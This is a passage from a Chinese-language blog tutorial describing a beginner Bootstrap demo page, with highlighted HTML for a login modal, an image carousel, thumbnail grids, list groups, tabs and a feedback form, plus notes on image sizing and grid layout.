class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;div class="modal-footer"&gt;</span></span><br><span class="line"><span class="regexp">          &lt;button type="button" class="btn btn-default" data-dismiss="modal"&gt;Close&lt;/</span>button&gt;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>div&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>div&gt;</span><br><span class="line">  &lt;!-- loginModal --&gt;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"modal fade"</span> id=<span class="string">"loginModal"</span> tabindex=<span class="string">"-1"</span> role=<span class="string">"dialog"</span> aria-labelledby=<span class="string">"myModalLabel"</span>&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"modal-dialog"</span> role=<span class="string">"document"</span>&gt;</span><br><span class="line">      &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"modal-content"</span>&gt;</span><br><span class="line">        &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"modal-header"</span>&gt;</span><br><span class="line">          &lt;button type=<span class="string">"button"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"close"</span> data-dismiss=<span class="string">"modal"</span> aria-label=<span class="string">"Close"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">span</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span>&amp;times;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">          &lt;h4 <span class="class"><span class="keyword">class</span></span>=<span class="string">"modal-title"</span> id=<span class="string">"myModalLabel"</span>&gt;登陆&lt;<span class="regexp">/h4&gt;</span></span><br><span class="line"><span class="regexp">        &lt;/</span>div&gt;</span><br><span class="line">        &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"modal-body"</span>&gt;</span><br><span class="line">          &lt;form&gt;</span><br><span class="line">            &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-group "</span>&gt;</span><br><span class="line">              &lt;label <span class="keyword">for</span>=<span class="string">"username"</span>&gt;用户名：&lt;<span class="regexp">/label&gt;</span></span><br><span class="line"><span class="regexp">              &lt;input type="text" class="form-control" id="username" placeholder="请输入用户名"&gt;</span></span><br><span class="line"><span class="regexp">            &lt;/</span>div&gt;</span><br><span class="line">            &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-group"</span>&gt;</span><br><span class="line">              &lt;label <span class="keyword">for</span>=<span class="string">"password"</span>&gt;密码：&lt;<span class="regexp">/label&gt;</span></span><br><span class="line"><span class="regexp">              &lt;input type="password" class="form-control" id="password" placeholder="请输入密码"&gt;</span></span><br><span class="line"><span class="regexp">            &lt;/</span>div&gt;</span><br><span class="line">            &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-inline"</span>&gt;</span><br><span class="line">              &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-group"</span>&gt;</span><br><span class="line">                &lt;label <span class="keyword">for</span>=<span class="string">"remPasswprd"</span>&gt;记住密码&lt;<span class="regexp">/label&gt;</span></span><br><span class="line"><span class="regexp">                &lt;input type="checkbox" id="remPasswprd"&gt;</span></span><br><span class="line"><span class="regexp">              &lt;/</span>div&gt;</span><br><span class="line">              &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"form-group form-inline"</span>&gt;</span><br><span class="line">                &lt;label <span class="keyword">for</span>=<span class="string">"read"</span>&gt;我已阅读条例&lt;<span class="regexp">/label&gt;</span></span><br><span class="line"><span class="regexp">                &lt;input type="checkbox" id="read"&gt;</span></span><br><span class="line"><span class="regexp">              &lt;/</span>div&gt;</span><br><span class="line">            &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">          &lt;/</span>form&gt;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;div class="modal-footer"&gt;</span></span><br><span class="line"><span class="regexp">          &lt;button type="button" class="btn btn-danger" data-dismiss="modal"&gt;&lt;span class="glyphicon glyphicon-remove"&gt;&lt;/</span>span&gt;<span class="xml"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">          &lt;button type=<span class="string">"button"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"btn btn-success"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-ok"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>div&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>div&gt;</span><br></pre></td></tr></table></figure></p><h3 id="轮播图"><a href="#轮播图" class="headerlink" title="轮播图"></a>轮播图</h3><p>  在说轮播图之前有个很重要的事就是轮播的<strong>图片规格一定要相同</strong>，因为没有找到和自己屏幕刚好适配的图，就去了壁纸网找到的几乎都是1900*1080分辨率的壁纸，图片大小参差不齐会导致图片的展示效果很不好，会被拉伸压缩(左边的导航条最后说)<br>  轮播图也是照搬文档的，整个模块都是自适应的。现在来说下因为图片踩到的坑，因为找到的图片太大，我就在思考，能否把图片缩小，给图片定义了高度之后发现缩小是缩小了，但是图片也被压缩了变得不好看。想要缩小图片而且不变形只能按照等比例缩小，但这样和我想要的全屏效果不符合，最后只能妥协，通过<strong>document.documentElement.clientHeight</strong>获得视口大小，把高度设置成这个<br>  <img src="/2019/03/27/一次简单的bootstrapDemo/lunbo.png" alt><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">"carousel"</span>&gt;</span><br><span class="line">  &lt;div id=<span class="string">"carousel-example-generic"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"carousel slide"</span> data-ride=<span class="string">"carousel"</span>&gt;</span><br><span class="line">  &lt;!-- Indicators --&gt;</span><br><span class="line">  &lt;ol <span class="class"><span class="keyword">class</span></span>=<span class="string">"carousel-indicators"</span>&gt;</span><br><span class="line">    &lt;li data-target=<span class="string">"#carousel-example-generic"</span> data-slide-to=<span class="string">"0"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"active"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">    &lt;li data-target=<span class="string">"#carousel-example-generic"</span> data-slide-to=<span class="string">"1"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">    &lt;li data-target=<span class="string">"#carousel-example-generic"</span> data-slide-to=<span class="string">"2"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">    &lt;li data-target=<span class="string">"#carousel-example-generic"</span> data-slide-to=<span class="string">"3"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">    &lt;li data-target=<span class="string">"#carousel-example-generic"</span> data-slide-to=<span class="string">"4"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">  &lt;<span class="regexp">/ol&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">  &lt;!-- Wrapper for slides --&gt;</span></span><br><span class="line"><span class="regexp">  &lt;div class="carousel-inner" role="listbox"&gt;</span></span><br><span class="line"><span class="regexp">    &lt;div class="item active"&gt;</span></span><br><span class="line"><span class="regexp">      &lt;a href="#"&gt;&lt;img src="img/</span>轮播<span class="number">1.</span>jpg<span class="string">" alt="</span>...<span class="string">" class="</span>img-responsive<span class="string">"&gt;&lt;/a&gt;</span></span><br><span class="line"><span class="string">      &lt;div class="</span>carousel-caption<span class="string">"&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;图1&lt;/h3&gt;</span></span><br><span class="line"><span class="string">      &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;div class="</span>item<span class="string">"&gt;</span></span><br><span class="line">      &lt;a href="#"&gt;&lt;img src="img/轮播2.jpg" alt="..." class="img-responsive"&gt;&lt;/a&gt;</span><br><span class="line">      &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"carousel-caption"</span>&gt;</span><br><span class="line">        &lt;h3&gt;图<span class="number">2</span>&lt;<span class="regexp">/h3&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>div&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &lt;div class="item"&gt;</span></span><br><span class="line"><span class="regexp">      &lt;a href="#"&gt;&lt;img src="img/</span>轮播<span class="number">3.</span>png<span class="string">" alt="</span>...<span class="string">" class="</span>img-responsive<span class="string">"&gt;&lt;/a&gt;</span></span><br><span class="line"><span class="string">      &lt;div class="</span>carousel-caption<span class="string">"&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;图3&lt;/h3&gt;</span></span><br><span class="line"><span class="string">      &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;div class="</span>item<span class="string">"&gt;</span></span><br><span class="line">      &lt;a href="#"&gt;&lt;img src="img/轮播4.jpg" alt="..." class="img-responsive"&gt;&lt;/a&gt;</span><br><span class="line">      &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"carousel-caption"</span>&gt;</span><br><span class="line">        &lt;h3&gt;图<span class="number">4</span>&lt;<span class="regexp">/h3&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>div&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &lt;div class="item"&gt;</span></span><br><span class="line"><span class="regexp">      &lt;a href="#"&gt;&lt;img src="img/</span>轮播<span class="number">5.</span>png<span class="string">" alt="</span>...<span class="string">" class="</span>img-responsive<span class="string">"&gt;&lt;/a&gt;</span></span><br><span class="line"><span class="string">      &lt;div class="</span>carousel-caption<span class="string">"&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;图5&lt;/h3&gt;</span></span><br><span class="line"><span class="string">      &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">  &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &lt;!-- Controls --&gt;</span></span><br><span class="line">  &lt;a class="left carousel-control" href="#carousel-example-generic" role="button" data-slide="prev"&gt;</span><br><span class="line">    &lt;span <span class="class"><span class="keyword">class</span></span>=<span class="string">"glyphicon glyphicon-chevron-left"</span> aria-hidden=<span class="string">"true"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line">    &lt;span <span class="class"><span class="keyword">class</span></span>=<span class="string">"sr-only"</span>&gt;Previous&lt;<span class="regexp">/span&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>a&gt;</span><br><span class="line">  &lt;a <span class="class"><span class="keyword">class</span></span>=<span class="string">"right carousel-control"</span> href=<span class="string">"#carousel-example-generic"</span> role=<span class="string">"button"</span> data-slide=<span class="string">"next"</span>&gt;</span><br><span class="line">    &lt;span <span class="class"><span class="keyword">class</span></span>=<span class="string">"glyphicon glyphicon-chevron-right"</span> aria-hidden=<span class="string">"true"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line">    &lt;span <span class="class"><span class="keyword">class</span></span>=<span class="string">"sr-only"</span>&gt;Next&lt;<span class="regexp">/span&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>a&gt;</span><br><span class="line">  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>div&gt;</span><br></pre></td></tr></table></figure></p><h3 id="缩略图"><a href="#缩略图" class="headerlink" title="缩略图"></a>缩略图</h3><p>  缩略图用到了bootstrap的栅格系统，因为分成了三分，所以每个都设置<strong>col-md-4</strong>，代表每个占1行里面宽度的三分之一(栅格系统默认一行分成12份)，再实现里面的文字居中<br>  <img src="/2019/03/27/一次简单的bootstrapDemo/ad.png" alt><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"container"</span> id=<span class="string">"ad"</span>&gt;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"row"</span>&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-md-4"</span>&gt;</span><br><span class="line">        &lt;img src=<span class="string">"./img/webpack.png"</span> alt=<span class="string">"..."</span>&gt;</span><br><span class="line">        &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"caption"</span>&gt;</span><br><span class="line">          &lt;h3&gt;webpack&lt;<span class="regexp">/h3&gt;</span></span><br><span class="line"><span class="regexp">          &lt;p&gt;Webpack 是当下最热门的前端资源模块化管理和打包工具。它可以将许多松散的模块按照依赖和规则打包成符合生产环境部署的前端资源。&lt;/</span>p&gt;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>div&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-md-4"</span>&gt;</span><br><span class="line">        &lt;img src=<span class="string">"./img/Bootstrap.png"</span> alt=<span class="string">"..."</span>&gt;</span><br><span class="line">        &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"caption"</span>&gt;</span><br><span class="line">          &lt;h3&gt;优站精选&lt;<span class="regexp">/h3&gt;</span></span><br><span class="line"><span class="regexp">          &lt;p&gt;Bootstrap 优站精选频道收集了众多基于 Bootstrap 构建、设计精美的、有创意的网站。&lt;/</span>p&gt;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>div&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-md-4"</span>&gt;</span><br><span class="line">        &lt;img src=<span class="string">"./img/react.png"</span> alt=<span class="string">"..."</span>&gt;</span><br><span class="line">        &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"caption"</span>&gt;</span><br><span class="line">          &lt;h3&gt;React&lt;<span class="regexp">/h3&gt;</span></span><br><span class="line"><span class="regexp">          &lt;p&gt;React 起源于 Facebook 的内部项目，是一个用于构建用户界面的 JavaScript 库。&lt;/</span>p&gt;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>div&gt;</span><br><span class="line">  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>div&gt;</span><br></pre></td></tr></table></figure></p><h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><p>  列表的使用要先使用<strong>list-group</strong>说明这个div是列表，列表头用<strong>list-group-item-heading</strong>，每一项就用<strong>list-group-item</strong>，这样每一项的外边都有个浅灰色的边框，也可以我们自己额外给每个item设置外边距，让其分开。每个item里面又设置成一行，用栅格系统把文字介绍和图片75分，即文字介绍<strong>col-md-7</strong>,图片<strong>col-md-5</strong>。另外给每个item设置了一些提供的默认样式可以其变成默认的颜色，例如<strong>list-group-item-info</strong>就变成了浅蓝色<br>  <img src="/2019/03/27/一次简单的bootstrapDemo/product.png" alt><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"container list-group"</span> id=<span class="string">"product"</span>&gt;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"list-group-item active product-show list-group-item-heading"</span>&gt;</span><br><span class="line">    &lt;h2&gt;产品介绍&lt;<span class="regexp">/h2&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>div&gt;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"row list-group-item list-group-item-info"</span>&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-md-7"</span>&gt;</span><br><span class="line">      &lt;h3&gt;图片<span class="number">0</span>&lt;<span class="regexp">/h3&gt;</span></span><br><span class="line"><span class="regexp">      &lt;p&gt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&lt;/</span>p&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &lt;div class="col-md-5"&gt;</span></span><br><span class="line"><span class="regexp">      &lt;img class="img-responsive" src="img/</span>shoot1.png<span class="string">" alt="</span><span class="string">"&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">  &lt;/div&gt;</span></span><br><span class="line"><span class="string">  &lt;hr&gt;</span></span><br><span class="line"><span class="string">  &lt;div class="</span>row list-group-item list-group-item-success<span class="string">"&gt;</span></span><br><span class="line"><span class="string">    &lt;div class="</span>col-md<span class="number">-5</span><span class="string">"&gt;</span></span><br><span class="line"><span class="string">      &lt;img class="</span>img-responsive<span class="string">" src="</span>img/shoot2.jpg<span class="string">" alt="</span><span class="string">"&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;div class="</span>col-md<span class="number">-7</span><span class="string">"&gt;</span></span><br><span class="line"><span class="string">      &lt;div class="</span>pull-right<span class="string">"&gt;</span></span><br><span class="line"><span class="string">        &lt;h3 class="</span>pull-right<span class="string">"&gt;图片1&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&lt;/p&gt;</span></span><br><span class="line"><span class="string">      &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">  &lt;/div&gt;</span></span><br><span class="line"><span class="string">  &lt;hr&gt;</span></span><br><span class="line"><span class="string">  &lt;div class="</span>row list-group-item<span class="string">"&gt;</span></span><br><span class="line"><span class="string">    &lt;div class="</span>col-md<span class="number">-7</span><span class="string">"&gt;</span></span><br><span class="line"><span class="string">      &lt;h3&gt;图片2&lt;/h3&gt;</span></span><br><span class="line"><span class="string">      &lt;p&gt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;div class="</span>col-md<span class="number">-5</span><span class="string">"&gt;</span></span><br><span class="line"><span class="string">      &lt;img class="</span>img-responsive<span class="string">" src="</span>img/shoot3.jpg<span class="string">" alt="</span><span class="string">"&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">  &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br></pre></td></tr></table></figure></p><h2 id="标签页和意见"><a href="#标签页和意见" class="headerlink" title="标签页和意见"></a>标签页和意见</h2><p>  在这一行里，通过一行的84分分成两部分，左边是标签页，右边是意见提交表单</p><h3 id="标签页"><a href="#标签页" class="headerlink" title="标签页"></a>标签页</h3><p>  在切换标签页面的时候需要设置每个a标签的href是对应标签页的id，举个例子<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//标签按钮</span></span><br><span class="line">&lt;a href=<span class="string">"#shoot2"</span> aria-controls=<span class="string">"profile"</span> role=<span class="string">"tab"</span> data-toggle=<span class="string">"tab"</span>&gt;shoot2&lt;<span class="regexp">/a&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/对应的标签页</span></span><br><span class="line"><span class="regexp">&lt;div role="tabpanel" class="tab-pane" id="shoot2"&gt;</span></span><br></pre></td></tr></table></figure></p><pre><code>这样才能一一对应到标签页，否则切换不了。</code></pre><h3 id="意见"><a href="#意见" class="headerlink" title="意见"></a>意见</h3><p>  意见框分成三个部分，第一是头像和用户名，第二是意见填写表单，第三是提交的按钮。头像图只需要给图片设定大小和<strong>img-circle</strong>就能显示圆框头像，为了给第一部分在意见框居中，设置成<strong>text-align:center</strong>。第二部分是表单部分，之前说过每个表单都要设置的<strong>label</strong>标签，但这里不需要显示出来，因此可以添加<strong>sr-only</strong>或<strong>hidden</strong>进行隐藏，再给<strong>textarea</strong>设置<strong>realize:none</strong>让其不能拉伸。第三部分的按钮设置了<strong>btn-group-justified</strong>让他自适用宽度。下面的是一个警告框<strong>alert-danger</strong><br>  <img src="/2019/03/27/一次简单的bootstrapDemo/suggestion.png" alt><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"container"</span> id=<span class="string">"suggestion"</span>&gt;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"row"</span>&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-md-8"</span>&gt;</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">      &lt;!-- Nav tabs --&gt;</span><br><span class="line">      &lt;ul <span class="class"><span class="keyword">class</span></span>=<span class="string">"nav nav-tabs product-name"</span> role=<span class="string">"tablist"</span>&gt;</span><br><span class="line">        &lt;li role=<span class="string">"presentation"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#shoot1"</span> <span class="attr">aria-controls</span>=<span class="string">"home"</span> <span class="attr">role</span>=<span class="string">"tab"</span> <span class="attr">data-toggle</span>=<span class="string">"tab"</span>  <span class="attr">style</span>=<span class="string">"background: #101010;color:#ffffff"</span>&gt;</span>shoot1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">        &lt;li role=<span class="string">"presentation"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#shoot2"</span> <span class="attr">aria-controls</span>=<span class="string">"profile"</span> <span class="attr">role</span>=<span class="string">"tab"</span> <span class="attr">data-toggle</span>=<span class="string">"tab"</span>&gt;</span>shoot2<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">        &lt;li role=<span class="string">"presentation"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#shoot3"</span> <span class="attr">aria-controls</span>=<span class="string">"messages"</span> <span class="attr">role</span>=<span class="string">"tab"</span> <span class="attr">data-toggle</span>=<span class="string">"tab"</span>&gt;</span>shoot3<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">      &lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">      &lt;!-- Tab panes --&gt;</span></span><br><span class="line"><span class="regexp">      &lt;div class="tab-content"&gt;</span></span><br><span class="line"><span class="regexp">        &lt;div role="tabpanel" class="tab-pane active" id="shoot1"&gt;</span></span><br><span class="line"><span class="regexp">          &lt;div class="row list-group-item"&gt;</span></span><br><span class="line"><span class="regexp">              &lt;div class="col-md-5"&gt;</span></span><br><span class="line"><span class="regexp">                &lt;h3&gt;图片0&lt;/</span>h3&gt;</span><br><span class="line">                &lt;p&gt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">              &lt;/</span>div&gt;</span><br><span class="line">              &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-md-7"</span>&gt;</span><br><span class="line">                &lt;img <span class="class"><span class="keyword">class</span></span>=<span class="string">"img-responsive"</span> src=<span class="string">"img/shoot1.png"</span> alt=<span class="string">""</span>&gt;</span><br><span class="line">              &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">          &lt;/</span>div&gt;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;div role="tabpanel" class="tab-pane" id="shoot2"&gt;</span></span><br><span class="line"><span class="regexp">          &lt;div class="row list-group-item"&gt;</span></span><br><span class="line"><span class="regexp">            &lt;div class="col-md-7"&gt;</span></span><br><span class="line"><span class="regexp">              &lt;img class="img-responsive" src="img/</span>shoot2.jpg<span class="string">" alt="</span><span class="string">"&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;div class="</span>col-md<span class="number">-5</span><span class="string">"&gt;</span></span><br><span class="line"><span class="string">              &lt;div class="</span>pull-right<span class="string">"&gt;</span></span><br><span class="line"><span class="string">                &lt;h3 class="</span>pull-right<span class="string">"&gt;图片1&lt;/h3&gt;</span></span><br><span class="line"><span class="string">                